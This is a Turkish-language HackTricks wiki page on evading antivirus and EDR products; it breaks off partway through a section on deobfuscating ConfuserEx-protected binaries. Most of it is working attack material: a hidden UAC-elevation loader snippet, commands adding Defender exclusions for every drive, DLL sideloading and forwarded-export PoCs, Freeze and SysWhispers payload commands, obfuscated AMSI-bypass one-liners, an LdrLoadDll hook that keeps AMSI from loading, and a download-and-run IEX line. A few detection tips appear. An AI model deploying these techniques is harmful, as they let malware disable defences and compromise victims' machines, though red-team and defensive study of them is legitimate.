# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p)** tarafından yazılmıştır!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durduran bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durduran bir araç.
- [Yöneticiyseniz Defender'ı devre dışı bırakın](basic-powershell-for-pentesters/README.md)

### Defender'a müdahale etmeden önce yükleyici tarzı UAC tuzağı

Oyun hilesi gibi görünen herkese açık loader'lar, genellikle önce **kullanıcıdan yükseltme izni isteyen**, ardından Defender'ı etkisiz hale getiren imzasız Node.js/Nexe yükleyicileri olarak sunulur. İşleyiş basittir:

1. `net session` ile yönetici bağlamını kontrol edin. Komut yalnızca çağıran kullanıcı yönetici haklarına sahipse başarılı olur; başarısız olması, loader'ın standart kullanıcı olarak çalıştığını gösterir.
2. Orijinal komut satırını koruyarak beklenen UAC onay istemini tetiklemek için `RunAs` fiiliyle kendisini hemen yeniden başlatın.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Kurbanlar zaten “crack’li” yazılım yüklediklerine inandığından, istem genellikle kabul edilir ve böylece malware, Defender ilkesini değiştirmek için ihtiyaç duyduğu hakları elde eder.<sup>[[26]](#references)</sup>

### Her sürücü harfi için genel `MpPreference` dışlamaları

Yetki yükseltildikten sonra, GachiLoader tarzı zincirler hizmeti tamamen devre dışı bırakmak yerine Defender’ın kör noktalarını en üst düzeye çıkarır. Loader önce GUI watchdog’u sonlandırır (`taskkill /F /IM SecHealthUI.exe`), ardından her kullanıcı profilinin, sistem dizininin ve çıkarılabilir diskin taranamaz hâle gelmesi için **son derece geniş dışlamalar** ekler:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Döngü, bağlı tüm dosya sistemlerini (D:\, E:\, USB bellekler vb.) dolaşır; bu nedenle diskin herhangi bir yerine bırakılacak **gelecekteki payload'lar yok sayılır**.
- `.sys` uzantısı istisnası ileriye dönüktür: saldırganlar, daha sonra Defender'a yeniden dokunmadan imzasız driver'lar yükleme seçeneğini saklı tutar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında yapılır; böylece sonraki aşamalar, UAC'yi yeniden tetiklemeden istisnaların kalıcı olduğunu doğrulayabilir veya bunları genişletebilir.

Hiçbir Defender servisi durdurulmadığından, basit durum denetimleri gerçek zamanlı inceleme bu yolları hiç taramasa bile “antivirus active” bildirmeye devam eder.<sup>[[26]](#references)</sup>

## **AV Evasion Metodolojisi**

Günümüzde AV'ler, bir dosyanın kötü amaçlı olup olmadığını kontrol etmek için farklı yöntemler kullanır: statik tespit, dinamik analiz ve daha gelişmiş EDR'lerde davranışsal analiz.

### **Statik tespit**

Statik tespit; bir binary veya script içindeki bilinen kötü amaçlı dizeleri ya da byte dizilerini işaretleyerek ve dosyanın kendisinden bilgi (ör. dosya açıklaması, şirket adı, dijital imzalar, simge, checksum vb.) çıkararak yapılır. Bu, bilinen public araçları kullanmanın yakalanma olasılığınızı artırabileceği anlamına gelir; çünkü bu araçlar muhtemelen analiz edilmiş ve kötü amaçlı olarak işaretlenmiştir. Bu tür tespitten kaçınmanın birkaç yolu vardır:

- **Encryption**

Binary'yi şifrelerseniz AV'nin programınızı tespit etmesi mümkün olmaz; ancak programın şifresini çözüp bellekte çalıştıracak bir tür loader'a ihtiyacınız olur.

- **Obfuscation**

Bazen binary'nizdeki veya script'inizdeki bazı dizeleri değiştirmek, AV'yi atlatmanız için yeterlidir; ancak neyi obfuscate etmeye çalıştığınıza bağlı olarak bu, zaman alıcı bir iş olabilir.

- **Custom tooling**

Kendi araçlarınızı geliştirirseniz bilinen kötü amaçlı imzalar bulunmaz; ancak bu çok fazla zaman ve emek gerektirir.

> [!TIP]
> Windows Defender'ın statik tespitini kontrol etmenin iyi bir yolu [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanmaktır. Dosyayı birden fazla segmente böler ve ardından Defender'dan her birini ayrı ayrı taramasını ister; bu sayede binary'nizde hangi dizelerin veya byte'ların işaretlendiğini tam olarak söyleyebilir.

Pratik AV Evasion hakkında bu [YouTube oynatma listesini](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) incelemenizi şiddetle tavsiye ederim.

### **Dinamik analiz**

Dinamik analiz, AV'nin binary'nizi bir sandbox'ta çalıştırıp kötü amaçlı etkinlikleri izlemesidir (ör. tarayıcınızın parolalarını çözmeye ve okumaya çalışmak, LSASS üzerinde minidump almak vb.). Bu kısımla çalışmak biraz daha zor olabilir; ancak sandbox'lardan kaçınmak için yapabileceğiniz bazı şeyler şunlardır:

- **Çalıştırmadan önce bekleme** Nasıl uygulandığına bağlı olarak bu, AV'nin dinamik analizini atlatmanın harika bir yolu olabilir. AV'lerin, kullanıcının iş akışını kesintiye uğratmamak için dosyaları taramak üzere çok az zamanı vardır; bu nedenle uzun süre bekletmek binary analizini aksatabilir. Sorun şu ki, birçok AV sandbox'ı, nasıl uygulandığına bağlı olarak beklemeyi atlayabilir.
- **Makinenin kaynaklarını kontrol etme** Sandbox'larda genellikle kullanılabilir kaynaklar çok azdır (ör. < 2GB RAM); aksi takdirde kullanıcının makinesini yavaşlatabilirler. Burada oldukça yaratıcı olabilirsiniz: örneğin CPU sıcaklığını, hatta fan hızlarını kontrol edebilirsiniz; sandbox'ta her şey uygulanmış olmayabilir.
- **Makineye özgü kontroller** "contoso.local" domain'ine katılmış bir kullanıcının iş istasyonunu hedeflemek istiyorsanız, bilgisayarın domain'inin belirttiğinizle eşleşip eşleşmediğini kontrol edebilirsiniz. Eşleşmiyorsa programınızdan çıkmasını sağlayabilirsiniz.

Microsoft Defender'ın Sandbox bilgisayar adının HAL9TH olduğu ortaya çıktı. Bu nedenle, detonation öncesinde malware'inizde bilgisayar adını kontrol edebilirsiniz. Ad HAL9TH ile eşleşiyorsa Defender'ın sandbox'ındasınız demektir; bu durumda programınızdan çıkmasını sağlayabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox'lara karşı koymak için [@mgeeky](https://twitter.com/mariuszbit) tarafından paylaşılan diğer bazı gerçekten iyi ipuçları:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Bu gönderide daha önce söylediğimiz gibi, **public araçlar** er ya da geç **tespit edilir**. Bu nedenle kendinize şunu sormalısınız:

Örneğin, LSASS dump'ı almak istiyorsanız, **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa daha az bilinen ve LSASS dump'ı alan farklı bir proje kullanabilir misiniz?

Muhtemelen doğru yanıt ikincisidir. Mimikatz'ı örnek alırsak, AV'ler ve EDR'ler tarafından en çok işaretlenen malware'lerden biridir. Projenin kendisi harika olsa da AV'leri atlatmak için onunla çalışmak tam bir kâbustur; bu nedenle başarmaya çalıştığınız şey için alternatiflere bakın.

> [!TIP]
> Evasion amacıyla payload'larınızı değiştirirken Defender'da **otomatik örnek gönderimini kapattığınızdan** emin olun. Uzun vadede evasion elde etmek istiyorsanız lütfen, gerçekten, **VIRUSTOTAL'A YÜKLEMEYİN**. Payload'ınızın belirli bir AV tarafından tespit edilip edilmediğini kontrol etmek istiyorsanız onu bir VM'ye kurun, otomatik örnek gönderimini kapatmayı deneyin ve sonuçtan memnun kalana kadar orada test edin.

## EXEs vs DLLs

Mümkün olduğunda evasion için her zaman **DLL kullanmaya öncelik verin**. Deneyimlerime göre DLL dosyaları genellikle **çok daha az tespit edilir** ve analiz edilir; dolayısıyla bazı durumlarda tespitten kaçınmak için kullanabileceğiniz oldukça basit bir yöntemdir (tabii payload'ınızın DLL olarak çalıştırılabilmesi gerekiyorsa).

Bu görselde görebileceğimiz gibi, Havoc'un DLL Payload'ı antiscan.me'de 4/26 tespit oranına sahipken EXE payload'ı 7/26 tespit oranına sahiptir.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me'de normal bir Havoc EXE payload'ı ile normal bir Havoc DLL'in karşılaştırması</p></figcaption></figure>

Şimdi DLL dosyalarıyla çok daha gizli kalmak için kullanabileceğiniz bazı püf noktalarını göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, victim uygulamasını ve kötü amaçlı payload'ları yan yana konumlandırarak loader'ın kullandığı DLL arama sırasından yararlanır.

[DLL Sideloading](https://github.com/Cybereason/siofra) için savunmasız programları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'i kullanarak kontrol edebilirsiniz:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Bu komut, `"C:\Program Files\\"` içindeki DLL hijacking'e açık programların ve yüklemeye çalıştıkları DLL dosyalarının listesini verir.

**DLL Hijackable/Sideloadable programları kendiniz araştırmanızı** şiddetle tavsiye ederim. Bu teknik doğru uygulandığında oldukça stealthy'dir; ancak herkese açık olarak bilinen DLL Sideloadable programları kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemeyi beklediği adla kötü amaçlı bir DLL yerleştirmek payload'unuzu çalıştırmaz; çünkü program, bu DLL'in içinde belirli işlevlerin bulunmasını bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adlı başka bir teknik kullanacağız.

**DLL Proxying**, bir programın proxy (ve kötü amaçlı) DLL'e yaptığı çağrıları orijinal DLL'e iletir. Böylece programın işlevselliğini korurken payload'unuzun yürütülmesini de sağlayabilirsiniz.

[@flangvik](https://twitter.com/Flangvik/) tarafından geliştirilen [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

İzlediğim adımlar şunlardı:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Bunlar sonuçlar:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz ([SGN](https://github.com/EgeBalci/sgn) ile encode edildi) hem de proxy DLL, [antiscan.me](https://antiscan.me) üzerinde 0/26 Detection rate değerine sahip! Buna başarı derim.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında [S3cur3Th1sSh1t'ın twitch VOD'unu](https://www.twitch.tv/videos/1644171543) ve konuştuklarımızı daha derinlemesine öğrenmek için [ippsec'in videosunu](https://www.youtube.com/watch?v=3eROsG_WNpE) **kesinlikle** izlemenizi öneririm.

### Forwarded Export'ları Kötüye Kullanma (ForwardSideLoading)

Windows PE modülleri, aslında "forwarder" olan işlevleri dışa aktarabilir: dışa aktarma girdisi kodu göstermek yerine `TargetDll.TargetFunc` biçiminde bir ASCII dizgesi içerir. Bir çağıran dışa aktarılan işlevi çözümlerken Windows loader şunları yapar:

- Henüz yüklenmemişse `TargetDll` dosyasını yükler
- `TargetFunc` işlevini bu dosyadan çözümler

Anlaşılması gereken temel davranışlar:
- `TargetDll` bir KnownDLL ise, korumalı KnownDLLs ad alanından sağlanır (ör. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- `TargetDll` bir KnownDLL değilse, forward çözümlemesini yapan modülün dizinini de içeren normal DLL arama sırası kullanılır.

Bu, dolaylı bir sideloading primitive'i sağlar: dışa aktardığı bir işlev KnownDLL olmayan bir modül adına forward edilen imzalı bir DLL bulun, ardından bu imzalı DLL'yi forward edilen hedef modülle tam olarak aynı ada sahip, saldırganın kontrolündeki bir DLL ile aynı dizine yerleştirin. Forward edilen dışa aktarılan işlev çağrıldığında loader forward'ı çözümler ve aynı dizinden sizin DLL'nizi yükleyerek DllMain'inizi çalıştırır.<sup>[[13]](#references)</sup>

Windows 11'de gözlemlenen bir örnek:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` bir KnownDLL değildir, bu nedenle normal arama sırasına göre çözümlenir.

PoC (kopyala-yapıştır):
1) İmzalı sistem DLL'sini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. DllMain'i tetiklemek için minimal bir DllMain yeterlidir; iletilen işlevi uygulamanız gerekmez.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) İmzalı bir LOLBin ile forward işlemini tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Gözlemlenen davranış:
- rundll32 (imzalı), side-by-side `keyiso.dll` dosyasını (imzalı) yükler
- `KeyIsoSetAuditingInterface` çözülürken loader, `NCRYPTPROV.SetAuditingInterface` yönlendirmesini takip eder
- Loader daha sonra `C:\test` konumundan `NCRYPTPROV.dll` dosyasını yükler ve `DllMain` işlevini çalıştırır
- `SetAuditingInterface` uygulanmamışsa, "missing API" hatasını ancak `DllMain` zaten çalıştıktan sonra alırsınız

Hunting ipuçları:
- Hedef modülün KnownDLL olmadığı yönlendirilmiş export'lara odaklanın. KnownDLL'ler `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Yönlendirilmiş export'ları şu araçlarla listeleyebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Tespit/savunma fikirleri:
- LOLBins'in (örn. rundll32.exe) sistem dışı yollardan imzalı DLL'ler yüklemesini ve ardından aynı temel ada sahip KnownDLLs olmayan DLL'leri bu dizinden yüklemesini izleyin
- Şu tür süreç/modül zincirleri için uyarı oluşturun: kullanıcı tarafından yazılabilir yollar altında `rundll32.exe` → sistem dışı `keyiso.dll` → `NCRYPTPROV.dll`
- Kod bütünlüğü ilkelerini (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde yazma+çalıştırma izinlerini engelleyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze, askıya alınmış süreçler, doğrudan syscalls ve alternatif yürütme yöntemleri kullanarak EDR'leri atlatmaya yönelik bir payload araç setidir`

Freeze'i shellcode'unuzu gizli bir şekilde yüklemek ve çalıştırmak için kullanabilirsiniz.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion bir kedi-fare oyunudur; bugün işe yarayan bir yöntem yarın tespit edilebilir. Bu yüzden hiçbir zaman tek bir araca güvenmeyin; mümkünse birden fazla evasion tekniğini zincirlemeyi deneyin.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR'lar genellikle `ntdll.dll` syscall stub'larına **user-mode inline hook** yerleştirir. Bu hook'ları atlatmak için doğru **SSN**'yi (System Service Number) yükleyen ve hook'lanmış export entrypoint'ini çalıştırmadan kernel mode'a geçiş yapan **direct** veya **indirect** syscall stub'ları oluşturabilirsiniz.<sup>[[32]](#references)</sup>

**Çağrı seçenekleri:**
- **Direct (embedded)**: Oluşturulan stub'a bir `syscall`/`sysenter`/`SVC #0` talimatı ekler (`ntdll` export'una uğramaz).
- **Indirect**: Kernel geçişinin `ntdll` kaynaklı görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget'ına atlar (heuristic evasion için kullanışlıdır); **randomized indirect**, her çağrıda bir havuzdan gadget seçer.
- **Egg-hunt**: Diskte statik `0F 05` opcode dizisini bulundurmaz; syscall dizisini çalışma zamanında çözümler.

**Hook-resistant SSN çözümleme stratejileri:**
- **FreshyCalls (VA sort)**: Stub baytlarını okumak yerine syscall stub'larını virtual address'e göre sıralayarak SSN'leri çıkarır.
- **SyscallsFromDisk**: Temiz bir `\KnownDlls\ntdll.dll` eşler, `.text` bölümünden SSN'leri okur ve ardından eşlemeyi kaldırır (bellekteki tüm hook'ları atlatır).
- **RecycledGate**: VA-sorted SSN çıkarımını temiz bir stub varsa opcode doğrulamasıyla birleştirir; stub hook'lanmışsa VA çıkarımına geri döner.
- **HW Breakpoint**: `syscall` talimatına DR0 ayarlar ve hook'lanmış baytları ayrıştırmadan çalışma zamanında `EAX` içindeki SSN'yi yakalamak için VEH kullanır.

SysWhispers4 kullanım örneği:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"ı önlemek için oluşturuldu. Başlangıçta AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu. Bu nedenle, payload'ları bir şekilde **doğrudan bellekte** çalıştırabilirseniz AV bunu önlemek için hiçbir şey yapamıyordu; çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir:

- User Account Control veya UAC (EXE, COM, MSI ya da ActiveX kurulumunun yükseltilmesi)
- PowerShell (script'ler, etkileşimli kullanım ve dinamik kod değerlendirme)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA makroları

Antivirüs çözümlerinin script davranışını, script içeriğini hem şifrelenmemiş hem de gizlenmemiş biçimde sunarak incelemesine olanak tanır.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` komutunu çalıştırmak Windows Defender'da aşağıdaki uyarıyı oluşturur.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` önekini ve ardından script'in çalıştığı yürütülebilir dosyanın yolunu eklediğine dikkat edin; bu örnekte bu dosya powershell.exe'dir.

Diske herhangi bir dosya bırakmadık, ancak AMSI nedeniyle yine de bellekte yakalandık.

Ayrıca, **.NET 4.8** ile birlikte C# kodu da AMSI üzerinden çalıştırılır. Bu, bellekte çalıştırma için `Assembly.Load(byte[])` kullanımını da etkiler. Bu nedenle, AMSI'den kaçınmak amacıyla bellekte çalıştırma yaparken daha düşük .NET sürümlerini (örneğin 4.7.2 veya daha düşük sürümleri) kullanmanız önerilir.

AMSI'yi aşmanın birkaç yolu vardır:

- **Obfuscation**

AMSI çoğunlukla statik tespit yöntemleri kullandığından, yüklemeye çalıştığınız script'leri değiştirmek tespit edilmekten kaçınmak için iyi bir yöntem olabilir.

Ancak AMSI, birden fazla katmanı olsa bile script'lerin gizlemesini çözebilir. Bu nedenle, nasıl yapıldığına bağlı olarak obfuscation kötü bir seçenek olabilir. Bu da tespitten kaçınmayı pek kolaylaştırmaz. Yine de bazen birkaç değişken adını değiştirmeniz yeterli olabilir; bu, bir şeyin ne ölçüde işaretlendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe vb.) sürecine bir DLL yüklenerek uygulandığından, ayrıcalıksız bir kullanıcı olarak çalışırken bile kolayca müdahale edilebilir. AMSI uygulamasındaki bu kusur nedeniyle araştırmacılar, AMSI taramasından kaçınmak için birden fazla yöntem bulmuştur.

**Hata Zorlama**

AMSI başlatma işlemini başarısız olmaya zorlamak (`amsiInitFailed`), geçerli süreç için hiçbir taramanın başlatılmamasına neden olur. Bu yöntem ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklandı ve Microsoft, yaygın kullanımını önlemek için bir imza geliştirdi.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSI'yi mevcut powershell süreci için kullanılamaz hâle getirmek tek satırlık bir powershell kodu gerektirdi. Elbette bu satırın kendisi AMSI tarafından işaretlendi; dolayısıyla bu tekniği kullanabilmek için bazı değişiklikler yapmak gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş bir AMSI bypass.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind that this will probably get flagged once this post comes out, so you should not publish any code if your plan is to stay undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and involves finding the address of the "AmsiScanBuffer" function in amsi.dll (which is responsible for scanning user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG. This way, the actual scan result will be 0, which is interpreted as a clean result.

> [!TIP]
> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.

There are also many other techniques used to bypass AMSI with powershell. Bunlar hakkında daha fazla bilgi edinmek için [**bu sayfaya**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**bu repoya**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) göz atın.

### amsi.dll yüklenmesini önleyerek AMSI'yi engelleme (LdrLoadDll hook)

AMSI, yalnızca `amsi.dll` geçerli sürece yüklendikten sonra başlatılır. Sağlam ve dilden bağımsız bir bypass yöntemi, `ntdll!LdrLoadDll` üzerinde istenen modül `amsi.dll` olduğunda hata döndüren bir user-mode hook yerleştirmektir. Sonuç olarak AMSI hiç yüklenmez ve bu süreçte tarama yapılmaz.<sup>[[23]](#references)</sup>

Uygulama taslağı (x64 C/C++ sözde kodu):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- PowerShell, WScript/CScript ve özel loader’larda çalışır (aksi durumda AMSI’yi yükleyecek her şeyde).
- Uzun komut satırı izlerinden kaçınmak için bunu stdin üzerinden script göndermekle (`PowerShell.exe -NoProfile -NonInteractive -Command -`) birlikte kullanın.
- LOLBins aracılığıyla çalıştırılan loader’larda kullanıldığı görülmüştür (ör. `DllRegisterServer` çağıran `regsvr32`).

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** aracı da AMSI’yi bypass etmek için script oluşturur.
**[https://amsibypass.com/](https://amsibypass.com/)** aracı da imza tespitinden kaçınmak için rastgele kullanıcı tanımlı fonksiyonlar, değişkenler ve karakter ifadeleri kullanan, ayrıca imza tespitinden kaçınmak için PowerShell anahtar sözcüklerinin karakter büyüklüğünü rastgele değiştiren bir script oluşturur.

**Tespit edilen imzayı kaldırma**

Mevcut işlemin belleğindeki tespit edilen AMSI imzasını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi araçlar kullanabilirsiniz. Bu araç, mevcut işlemin belleğini AMSI imzası için tarayıp ardından imzayı NOP talimatlarıyla üzerine yazarak bellekten etkili bir şekilde kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**PowerShell sürüm 2’yi kullanma**
PowerShell sürüm 2’yi kullanırsanız AMSI yüklenmez; böylece script’lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging, bir sistemde yürütülen tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Denetim ve sorun giderme amaçları için yararlı olabilir, ancak **tespit edilmekten kaçınmak isteyen saldırganlar için sorun oluşturabilir**.

PowerShell logging'i atlatmak için aşağıdaki teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i devre dışı bırakın**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **PowerShell sürüm 2'yi kullanın**: PowerShell sürüm 2'yi kullanırsanız AMSI yüklenmez, böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Şöyle yapabilirsiniz: `powershell.exe -version 2`
- **Yönetilmeyen bir PowerShell oturumu kullanın**: PowerShell'i `powershell.exe`'yi başlatmadan barındırmak için [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (Cobalt Strike'ın `powerpick` tarafından kullanılan yaklaşım). Bu yöntem, özellikle `powershell.exe` sürecine bağlı denetimleri atlatır; ancak AMSI'yi, Script Block Logging'i veya diğer tüm PowerShell savunmalarını doğası gereği devre dışı bırakmaz. Kapsam, çalışma zamanına ve host uygulamasına bağlıdır.


## Obfuscation

> [!TIP]
> Birkaç obfuscation tekniği verileri şifrelemeye dayanır; bu da binary'nin entropisini artırarak AV ve EDR'ların onu daha kolay tespit etmesine yol açar. Bu konuda dikkatli olun ve şifrelemeyi yalnızca kodunuzun hassas olan veya gizlenmesi gereken belirli bölümlerine uygulayın.

### ConfuserEx ile Korunan .NET Binary'lerini Deobfuscate Etme

ConfuserEx 2 (veya ticari fork'ları) kullanan malware'i analiz ederken, decompiler'ları ve sandbox'ları engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki iş akışı, daha sonra dnSpy veya ILSpy gibi araçlarda C#'a decompile edilebilecek, **orijinale yakın bir IL'yi** güvenilir biçimde geri yükler.<sup>[[10]](#references)</sup>

1.  Anti-tampering'i kaldırma – ConfuserEx her *method body*'yi şifreler ve şifreyi `<Module>.cctor` statik constructor'ı içinde çözer. Ayrıca PE checksum'ını yamalayarak herhangi bir değişikliğin binary'nin çökmesine yol açmasını sağlar. Şifrelenmiş metadata tablolarını bulmak, XOR anahtarlarını kurtarmak ve temiz bir assembly'yi yeniden yazmak için **AntiTamperKiller** kullanın:
